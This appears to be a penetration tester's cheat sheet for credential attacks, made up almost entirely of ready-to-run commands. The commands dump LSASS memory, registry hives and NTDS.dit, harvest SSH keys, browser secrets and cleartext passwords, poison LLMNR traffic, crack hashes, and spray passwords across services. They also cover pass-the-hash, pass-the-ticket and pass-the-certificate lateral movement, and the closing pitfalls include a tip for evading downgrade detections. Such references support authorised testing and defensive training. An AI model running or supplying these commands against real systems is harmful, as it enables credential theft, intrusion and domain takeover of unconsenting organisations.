The one page you keep open during a credential-focused engagement. Methodology up top, raw commands below.

## Methodology Checklist

1. **Collect** — grab anything cleartext first: share files, `history`, `.bash_history`, config files, scripts, group policy preferences, recorded network traffic.
2. **Dump** — LSASS, SAM/SYSTEM/SECURITY, NTDS.dit, `/etc/shadow`, DPAPI vaults, SSH keys.
3. **Identify** — know the hash format before picking a mode (NTLM, Kerberos TGS/AS-REP, DCC2, bcrypt, MD5/SHA, sha512crypt).
4. **Crack** — try rockyou first, then rule-mangled wordlists, then masks.
5. **Reuse** — if cracking fails, pass the hash / ticket / certificate.
6. **Spray** — one password across many accounts before many passwords against one.
7. **Pivot** — every cred found is a seed for the next host.

## Hash Identification

| Hash format | Where it comes from | Hashcat mode |
|---|---|---|
| `aad3b435b51404ee...:hash` | SAM, LSASS, NTDS.dit | 1000 (NTLM) |
| `$krb5tgs$23$*...` | Kerberoasting | 13100 |
| `$krb5asrep$23$...` | AS-REP Roasting | 18200 |
| `$DCC2$10240#user#hash` | SECURITY hive / LSASS | 2100 |
| `$6$salt$...` | `/etc/shadow` sha512crypt | 1800 |
| `$y$j9T$...` | modern `/etc/shadow` yescrypt | 29700 |
| `*HexHash` | MySQL | 300 |
| `0x0100...` | MSSQL (SHA-512) | 1731 |

## Windows Credential Extraction

```powershell
# LSASS — need SYSTEM or SeDebugPrivilege
tasklist /svc | findstr lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp   # parse on Linux

# SAM / SYSTEM / SECURITY — need local Admin
reg.exe save hklm\sam    C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# NetExec one-shots (remote)
netexec smb <IP> --local-auth -u bob -p 'Pass!' --sam
netexec smb <IP> --local-auth -u bob -p 'Pass!' --lsa
netexec smb <IP> -u admin -p 'Pass!' --ntds

# Credential Manager
cmdkey /list
runas /savecred /user:DOMAIN\user cmd.exe
mimikatz "privilege::debug" "sekurlsa::credman"

# DPAPI (browser, RDP, Outlook)
mimikatz "dpapi::chrome /in:\"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data\" /unprotect"
DonPAPI <domain>/<user>:<pw>@<target>
```

## NTDS.dit (Domain Compromise)

```powershell
# On DC with Admin rights
vssadmin CREATE SHADOW /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
reg.exe save hklm\system C:\NTDS\SYSTEM
```
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
# or, no-touch:
netexec smb <DC-IP> -u bob -p 'Pass!' -M ntdsutil
```

## Linux Credential Extraction

```bash
# /etc/shadow — need root
unshadow /etc/passwd /etc/shadow > hashes.txt
hashcat -m 1800 hashes.txt rockyou.txt

# Broad hunt
grep -rniE 'password|passwd|pwd|credential|api[_-]?key|secret' / 2>/dev/null
find / -name 'id_rsa' -o -name '*.pem' -o -name '*.kdbx' 2>/dev/null
cat ~/.bash_history ~/.*_history 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
mimipenguin.sh         # cleartext from gnome-keyring/vsftpd/sshd/etc
laZagne all
```

## Network / Share Hunting

```bash
# File shares
snaffler.exe -s -o snaffler.log
manspider //<IP>/share -u user -p pass -c 'password|passwd|credential'
netexec smb <IP>/24 -u user -p pass -M spider_plus

# Live network creds
sudo responder -I tun0 -A        # Analyze mode — no poisoning
sudo responder -I tun0 -wrf      # LLMNR/NBT-NS poisoning
sudo ./Pcredz -i tun0            # pulls plaintext from traffic
sudo ./Pcredz -f capture.pcap -t -v
```

## Password Cracking

```bash
# Hashcat (GPU)
hashcat -m 1000 ntlm.txt rockyou.txt                    # dictionary
hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?l?d?d          # mask
hashcat --show -m 1000 ntlm.txt                         # view cracked

# John (CPU)
john --wordlist=rockyou.txt --format=NT ntlm.txt
john --show --format=NT ntlm.txt

# Archive / file crackers → convert to john format first
zip2john archive.zip > zip.hash
pdf2john document.pdf > pdf.hash
office2john file.docx > office.hash
ssh2john id_rsa > ssh.hash
keepass2john file.kdbx > kp.hash

# Custom wordlists
cewl https://target.com -d 2 -m 6 -w site.txt
hashcat --stdout rockyou.txt -r rules/best64.rule > mangled.txt
# username-based
./username-anarchy -i names.txt > users.txt
```

## Remote Password Attacks

```bash
# NetExec — fast across many services
netexec smb   <IP> -u users.txt -p pass -d <domain>
netexec winrm <IP> -u user -p pass
netexec ssh   <IP> -u user -p pass
netexec mssql <IP> -u sa -p pass

# Hydra per-service
hydra -L users.txt -P pass.txt ssh://<IP>
hydra -L users.txt -P pass.txt rdp://<IP>
hydra -l admin    -P pass.txt ftp://<IP>
hydra -l admin    -P pass.txt mysql://<IP>

# Password spraying — one pass, many users
netexec smb <IP> -u users.txt -p 'Winter2025!' --continue-on-success
kerbrute passwordspray --dc <IP> -d <domain> users.txt 'Winter2025!'
```

## Lateral Movement with Stolen Material

```bash
# Pass-the-Hash
impacket-psexec    administrator@<IP> -hashes :<NThash>
impacket-wmiexec   administrator@<IP> -hashes :<NThash>
evil-winrm -i <IP> -u Administrator  -H <NThash>
netexec smb <IP>/24 -u Admin -H <NThash> --local-auth

# Overpass-the-Hash / Pass-the-Key
Rubeus.exe asktgt /user:user /aes256:<key> /ptt
mimikatz "sekurlsa::pth /user:user /domain:<dom> /aes256:<key> /run:cmd.exe"

# Pass-the-Ticket
mimikatz "sekurlsa::tickets /export"
Rubeus.exe dump /nowrap
Rubeus.exe ptt /ticket:<file-or-b64>
# Linux
export KRB5CCNAME=/tmp/user.ccache
klist
smbclient //dc01/share -k -no-pass
proxychains impacket-wmiexec dc01 -k

# Pass-the-Certificate (ADCS)
python3 gettgtpkinit.py -cert-pfx user.pfx '<dom>/<user>' /tmp/u.ccache
export KRB5CCNAME=/tmp/u.ccache
evil-winrm -i dc01 -r <dom>
```

## Kerberos User Enumeration (no lockout)

```bash
./username-anarchy -i names.txt > users.txt
kerbrute userenum --dc <IP> --domain <dom> users.txt
```

## Common Pitfalls

- `impacket-psexec` hash format is `LM:NT` — use `:NT` when LM is empty.
- `-d .` in NetExec means **local** account; `-d <dom>` means domain.
- UAC token filter (`LocalAccountTokenFilterPolicy=0`) blocks PtH with non-RID-500 local admins.
- DCC2 hashes **cannot** be used for Pass-the-Hash — must be cracked.
- Always backup `$KRB5CCNAME` before `kinit` — it overwrites.
- Prefer AES256 keys over RC4/NTLM; RC4 triggers encryption-downgrade detections.
